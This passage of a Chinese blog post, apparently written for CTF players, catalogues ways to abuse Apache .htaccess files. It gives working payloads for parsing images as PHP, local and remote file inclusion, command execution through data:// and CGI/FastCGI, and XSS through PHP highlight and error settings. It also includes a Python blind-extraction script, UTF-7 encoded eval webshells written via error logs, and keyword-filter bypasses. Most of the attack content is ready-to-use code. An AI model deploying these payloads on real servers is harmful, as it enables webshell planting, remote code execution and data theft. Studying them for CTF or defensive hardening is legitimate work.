^(.*[^/])$ %&#123;REQUEST_URI&#125;/ </span><br></pre></td></tr></table></figure><blockquote><p>**<code>%&#123;REQUEST_FILENAME&#125;</code>**：Apache 变量，表示用户请求路径对应的服务器物理路径</p><p>**<code>-d</code>**：测试是否为存在的目录</p></blockquote><h3 id="允许-禁止显示目录列表"><a href="#允许-禁止显示目录列表" class="headerlink" title="允许&#x2F;禁止显示目录列表"></a>允许&#x2F;禁止显示目录列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 禁止目录列表</span><br><span class="line">Options -Indexes</span><br></pre></td></tr></table></figure><blockquote><p>对当前目录及所有子目录，访问无索引文件的目录时返回 <strong>403 Forbidden</strong> 错误。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 允许目录列表</span><br><span class="line">Options +Indexes</span><br></pre></td></tr></table></figure><h2 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h2><h3 id="SetHandler"><a href="#SetHandler" class="headerlink" title="SetHandler"></a>SetHandler</h3><p>SetHandler指令可以<strong>强制所有匹配的文件被一个指定的处理器处理。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><blockquote><p><strong>当前目录以及子目录所有文件将会被当作php解析。</strong></p></blockquote><h3 id="AddHandler"><a href="#AddHandler" class="headerlink" title="AddHandler"></a>AddHandler</h3><p>AddHandler 指令可以实现<strong>在文件扩展名与特定的处理器之间建立映射。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><blockquote><p><strong>扩展名为.jpg的文件会被当作php解析</strong></p></blockquote><h3 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a>AddType</h3><p>与AddHandler作用一样，AddType 指令可以将<strong>给定的文件扩展名映射到指定的内容类型。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><blockquote><p><strong>将jpg后缀文件当作php文件执行</strong></p></blockquote><h3 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a>php_value</h3><p>当PHP作为Apache模块时，可以通过Apache的配置文件如httpd.conf或.htaccess文件中的指令来修改php的配置。但需要有AllowOverride Options 或AllowOverride All 权限才可以。</p><p>查看<a href="https://www.php.net/manual/zh/configuration.changes.modes.php">配置可被设定范围</a>:</p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-174707.png"></p><p>可以看到.htaccess只能用于<strong>PHP_INI_ALL或PHP_INI_PERDIR</strong>类型的指令。</p><p>然后可以在<a href="https://www.php.net/manual/zh/ini.list.php">php.ini配置选项列表中找到可用的指令</a>:</p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-175445.png"></p><ul><li><strong>auto_prepend_file：在主文件解析之前自动解析包含的文件</strong></li><li><strong>auto_append_file：在主文件解析后自动解析包含的文件</strong></li></ul><p>可以设置<code>auto_prepend_file/auto_append_file</code>进行文件包含，包含的文件可以使用php伪协议：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#在主文件解析之前自动解析包含1.jpg的内容</span><br><span class="line">php_value auto_prepend_file 1.jpg</span><br><span class="line"></span><br><span class="line">#在主文件解析后自动解析2.jpg的内容</span><br><span class="line">php_value auto_append_file 2.jpg</span><br><span class="line"></span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.txt&quot;</span><br></pre></td></tr></table></figure><h3 id="php-flag"><a href="#php-flag" class="headerlink" title="php_flag"></a>php_flag</h3><p>php_flag 用来设定<strong>布尔值的php 配置指令</strong>。</p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag name on|off</span><br></pre></td></tr></table></figure><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ%E6%88%AA%E5%9B%BE20250322181309.png"></p><p>可以将 <code>engine</code> 设置为 0,在本目录和子目录中关闭 <code>php</code> 解析,造成源码泄露：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine 0</span><br></pre></td></tr></table></figure><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>通过利用php_flag将<code>engine</code>设置为0，关闭php解析，从而造成源码泄露：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine 0</span><br></pre></td></tr></table></figure><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-213940.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-213954.png"></p><h3 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h3><p>在设有黑名单的文件上传中，如果没有过滤.htaccess，我们可以通过上传.htaccess文件将图片作为php文件解析</p><p>可以使用的指令有:</p><ul><li><p><strong>SetHandler</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 将ma.jpg 当做 PHP 执行</span><br><span class="line">&lt;FilesMatch  &quot;ma.jpg&quot;&gt;</span><br><span class="line">SetHandler  application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>AddType&#x2F;AddHandler</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#将jpg后缀当作php代码执行</span><br><span class="line">AddHandler application/x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-214236.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-214419.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-214259.png"></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>可通过php_value指令设置 <code>auto_prepend_file</code>或者 <code>auto_append_file</code> 配置选项包含一些敏感文件，但需要本目录或者子目录有可执行的php文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#在主文件解析之前自动解析包含ma.jpg的内容</span><br><span class="line">php_value auto_prepend_file ma.jpg</span><br><span class="line"></span><br><span class="line">#在主文件解析后自动解析ma.jpg的内容</span><br><span class="line">php_value auto_append_file ma.jpg</span><br></pre></td></tr></table></figure><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-215144.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-215205.png"></p><h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p><strong>前提：php.ini的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON使include&#x2F;require函数能够使用。</strong></p><blockquote><p>因为all_url_include 的配置范围为 PHP_INI_SYSTEM,所以无法利用 php_flag 在 .htaccess 中开启</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file http://xxx/ma.php</span><br></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="配合伪协议"><a href="#配合伪协议" class="headerlink" title="配合伪协议"></a>配合伪协议</h4><p>这里可利用<code>data://</code>伪协议进行命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#allow_url_fopen: on,allow_url_include: on </span><br><span class="line">php_value auto_append_file &quot;data://test/plain,&lt;?php phpinfo();?&gt;&quot;</span><br></pre></td></tr></table></figure><h4 id="解析-htaccess自身执行命令"><a href="#解析-htaccess自身执行命令" class="headerlink" title="解析.htaccess自身执行命令"></a>解析.htaccess自身执行命令</h4><p>不仅如此，.htaccess还可以通过包含自己来进行命令执行：</p><ul><li><p><strong>当前目录有php执行文件的情况下</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#&lt;?php phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-220911.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-221006.png"></p></li><li><p><strong>当前目录没有php执行文件的情况下</strong></p><p>关键：<strong>需要先设置允许可访问 .htaccess 文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files .htaccess&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">Require all granted</span><br><span class="line">php_flag engine on</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line">#&lt;?php phpinfo();</span><br></pre></td></tr></table></figure><blockquote><p>也可以利用<code>&lt;FilesMatch</code></p></blockquote><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-221809.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-221745.png"></p></li></ul><h4 id="CGI脚本执行"><a href="#CGI脚本执行" class="headerlink" title="CGI脚本执行"></a>CGI脚本执行</h4><p>参考：[De1CTF2020 check in](<a href="https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check">https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check</a> in)</p><p><strong>CGI（Common Gateway Interface）</strong> 是一种标准协议，允许 Web 服务器（如 Apache）与外部程序（如 Shell、Python、Perl 脚本）交互。即我们可以通过cgi来执行shell等脚本。</p><p>前提：<strong>启用了cgi模块，同时<code>cgi_module</code>需要加载，即apache配置文件中有</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule cgi_module modules/mod_cgi.so</span><br></pre></td></tr></table></figure><blockquote><p>启用cgi模块要根据 MPM 类型选择模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apache2ctl -V | grep MPM</span><br><span class="line"># 输出示例：Server MPM: prefork</span><br></pre></td></tr></table></figure><p><strong><code>prefork</code> MPM</strong> → 使用 <code>mod_cgi</code>：<code>a2enmod cgi</code></p><p><strong><code>worker</code>&#x2F;<code>event</code> MPM</strong> → 使用 <code>mod_cgid</code>：<code>a2enmod cgid</code></p></blockquote><p>在.htaccess文件中添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI   #允许在指定目录下执行 CGI脚本</span><br><span class="line">AddHandler cgi-script .sh  #将扩展名为 .sh 的文件关联到 CGI脚本处理器。</span><br></pre></td></tr></table></figure><p>再写一个简单的CGI脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Content-type: text/plain\r\n&quot;</span>  <span class="comment">#必需的HTTP头信息</span></span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>访问sh文件即可：</p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-231223.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-231454.png"></p><blockquote><p>复现不成功可能是因为文件权限不够，可以赋予脚本执行权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /var/www/html/1.sh</span><br></pre></td></tr></table></figure></blockquote><h4 id="FastCGI脚本执行"><a href="#FastCGI脚本执行" class="headerlink" title="FastCGI脚本执行"></a>FastCGI脚本执行</h4><p>与CGI一样可以和外部程序交互，但<code>mod_fcgid.so</code>需要被加载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule fcgid_module modules/mod_fcgid.so</span><br></pre></td></tr></table></figure><blockquote><p>下载fcgid：<code>apt-get install libapache2-mod-fcgid</code></p><p>启动：<code>a2enmod fcgid</code></p></blockquote><p>.htaccess:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI  #允许在指定目录下执行CGI或FastCGI脚本。</span><br><span class="line">AddHandler fcgid-script .xx  #将扩展名为.xx 的文件关联到FastCGI处理器(mod_fcgid)。</span><br><span class="line">FcgidWrapper &quot;/bin/sh&quot; .xx  #指定用于执行.xx 文件的 解释器路径。</span><br></pre></td></tr></table></figure><p>1.xx:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Content-Type: text/plain&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>访问1.xx即可</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file"></a>highlight_file</h4><p>主要通过.hataccess文件设定<strong>highlight.comment</strong>，指定高亮内容，进行XSS。</p><p>.htaccess:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value highlight.comment &#x27;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#x27;</span><br></pre></td></tr></table></figure><blockquote><p><code>highlight.comment</code> 是 PHP 的语法高亮配置选项，用于定义 <strong>注释部分的颜色</strong>（如 <code>#FF8000</code>）。</p></blockquote><p>其中highlight.comment也可换成如下其他选项：</p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250323-153718.png"></p><p>1.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// comment</span></span><br></pre></td></tr></table></figure><p>原理就是<code>highlight_file(__FILE__)</code>函数会输出当前文件的内容，并用PHP语法高亮显示。这意味着<strong>它会将PHP代码转换为带有颜色标记的HTML代码。</strong>注释部分（以<code>//</code>或<code>#</code>开头的行，以及<code>/* */</code>之间的内容）会根据<code>highlight.comment</code>的设置进行高亮，当定义高亮内容时，<strong>PHP会将内容直接穿插在<code>&lt;span&gt;</code>标签的style属性中，且未转义特殊字符</strong>，导致HTML结构被破坏，即最后产生的HTML片段为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color: &quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;// comment<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>刚好闭合了前面的<code>&lt;&quot;</code></strong></p></blockquote><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250323-155658.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250323-154715.png"></p><h4 id="错误信息链接"><a href="#错误信息链接" class="headerlink" title="错误信息链接"></a>错误信息链接</h4><p>通过 <code>.htaccess</code> 设置 <code>php_value docref_root</code>，结合 PHP 错误信息的 <strong>HTML 渲染机制</strong>，可在错误页面中注入<strong>未转义的脚本代码</strong>，触发 XSS 攻击。</p><p>1.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;foo&#x27;</span>);<span class="comment">#包含不存在的文件促发PHP错误</span></span><br></pre></td></tr></table></figure><p>.htaccess：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_flag display_errors 1       # 允许显示错误信息</span><br><span class="line">php_flag html_errors 1          # 将错误信息格式化为HTML</span><br><span class="line">php_value docref_root &quot;&#x27;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;  # 注入恶意字符串</span><br></pre></td></tr></table></figure><blockquote><p><code>docref_root</code> 是 PHP 的配置选项，用于定义 <strong>错误消息中链接的 PHP 官方文档的根 URL</strong>，这里直接改成我们的恶意代码</p></blockquote><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250323-162725.png"></p><h3 id="利用404页面盲注"><a href="#利用404页面盲注" class="headerlink" title="利用404页面盲注"></a>利用404页面盲注</h3><p>.htaccess：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;If &quot;file(&#x27;/flag&#x27;) =~ &#x27;/flag&#123;a/&#x27;&quot;&gt;</span><br><span class="line">ErrorDocument 404 &quot;b1uel0n3&quot;</span><br><span class="line">&lt;/If&gt;</span><br></pre></td></tr></table></figure><p>利用匹配成功返回带有b1uel0n3的404内容进行盲注来获取flag</p><p>盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://example.com/upload.php&quot;</span>  <span class="comment"># 文件上传接口</span></span><br><span class="line">CHECK_URL = <span class="string">&quot;http://example.com/not_exist_path&quot;</span>  <span class="comment"># 触发404的路径</span></span><br><span class="line">FLAG_PREFIX = <span class="string">&quot;flag&#123;&quot;</span>  <span class="comment"># Flag已知前缀</span></span><br><span class="line">CHARSET = string.ascii_letters + string.digits + <span class="string">&quot;_!@#$%^&amp;*()-=+&#123;&#125;&quot;</span>  <span class="comment"># 字符集</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_htaccess</span>(<span class="params">payload</span>):</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>, payload, <span class="string">&#x27;text/plain&#x27;</span>)&#125;</span><br><span class="line">    r = requests.post(TARGET_URL, files=files)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text  <span class="comment"># 根据上传接口返回判断是否成功</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_response</span>():</span><br><span class="line">    r = requests.get(CHECK_URL)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;b1uel0n3&quot;</span> <span class="keyword">in</span> r.text  <span class="comment"># 自定义404响应关键词</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_injection</span>():</span><br><span class="line">    flag = FLAG_PREFIX</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> CHARSET:</span><br><span class="line">            current_guess = flag + c</span><br><span class="line">            <span class="comment"># 构造正则匹配规则：当前猜测字符 + 后续任意字符直到&#125;</span></span><br><span class="line">            regex = <span class="string">f&quot;^<span class="subst">&#123;re.escape(current_guess)&#125;</span>.*\\&#125;&#125;$&quot;</span></span><br><span class="line">            htaccess_content = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;If &quot;file(&#x27;/flag&#x27;) =~ /<span class="subst">&#123;regex&#125;</span>/&quot;&gt;</span></span><br><span class="line"><span class="string">    ErrorDocument 404 &quot;b1uel0n3&quot;</span></span><br><span class="line"><span class="string">&lt;/If&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> upload_htaccess(htaccess_content):</span><br><span class="line">                <span class="keyword">if</span> check_response():</span><br><span class="line">                    flag += c</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] Current Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                    found = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">if</span> c == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;[!] Flag found:&quot;</span>, flag)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Failed to find next character&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    blind_injection()</span><br></pre></td></tr></table></figure><h3 id="利用报错日志写马"><a href="#利用报错日志写马" class="headerlink" title="利用报错日志写马"></a>利用报错日志写马</h3><p>参考：[<a href="https://buuoj.cn/challenges#[XNUCA2019Qualifier]EasyPHP">XNUCA2019Qualifier]EasyPHP</a></p><p>思路就是error_log能将<strong>PHP运行报错的记录写到指定文件</strong>，而<code>include_path</code> 是 PHP 的配置选项，用于定义 PHP 在包含文件（如 <code>include</code>、<code>require</code>）时搜索文件的目录列表。当使用相对路径或未指定路径时，<strong>PHP 会按照 <code>include_path</code> 中设置的目录顺序查找文件。</strong></p><p><strong>所以我们通过.htaccess文件设定error_log选项来定义我们错误文件的存储路径，再配合include_path将🐎当作错误路径解析从而将🐎写入文件</strong></p><p>error.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;fooo&#x27;</span>);<span class="comment">#包含不存在的文件促发PHP错误</span></span><br></pre></td></tr></table></figure><p>.htaccess：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log /var/www/html/shell.php</span><br><span class="line">php_value include_path &quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250323-171432.png"></p><p>可以看到我们的路径成功写进去了，但存在<code>&lt;&gt;</code>被html编码转义问题。</p><p>这里我们需要用<strong>UTF-7编码</strong>来进行绕过，这里参考[XNUCA2019Qualifier]EasyPHP的解法：</p><p>先将带有<strong>UTF-7编码转换的🐎写入文件</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;+ADw?php eval(+ACQAXw-POST+AFs&#x27;a&#x27;+AF0)+ADs?+AD4-&quot;</span><br><span class="line">php_value error_log /tmp/fl3g.php</span><br></pre></td></tr></table></figure><blockquote><p>一般来说www-data在<code>/var/www/html</code>都没有写的权限的，所以写入<code>/tmp/</code>目录下</p></blockquote><p>然后利用UTF-7来解析写了🐎的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;/tmp&quot;   #指定目录找包含文件</span><br><span class="line">php_flag zend.multibyte 1       #启用 PHP 的多字节字符编码支持（如 UTF-8、UTF-7）。</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot; #指定 PHP 脚本文件的字符编码为 UTF-7。</span><br></pre></td></tr></table></figure><p>此时已经包含了上传的🐎文件，直接访问主文件连蚁剑或者RCE即可</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><h4 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="\反斜杠绕过"></a>\反斜杠绕过</h4><p>对于关键字的过滤我们可以利用<code>\</code>绕过，在.htaccess中<strong>支持<code>\</code>拼接上下两行</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p\</span><br><span class="line">hp_value auto_prepend_fi\</span><br><span class="line">le ma.jpg</span><br></pre></td></tr></table></figure><h4 id="UTF-7编码绕过"><a href="#UTF-7编码绕过" class="headerlink" title="UTF-7编码绕过"></a>UTF-7编码绕过</h4><p>对于<code>&lt;?</code>等字符的检测可以用UTF-7编码来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">#+ADw-?php+ACA-+AEA-eval(+ACQ-+AF8-POST+AFs-&#x27;shell&#x27;+AF0-)+ADs-+ACA-?+AD4-</span><br></pre></td></tr></table></figure><h4 id="伪协议绕过"><a href="#伪协议绕过" class="headerlink" title="伪协议绕过"></a>伪协议绕过</h4><p>同样对于过滤<code>&lt;?php</code>等敏感内容也可以采用php:&#x2F;&#x2F;filter伪协议配合base64等其他编码绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 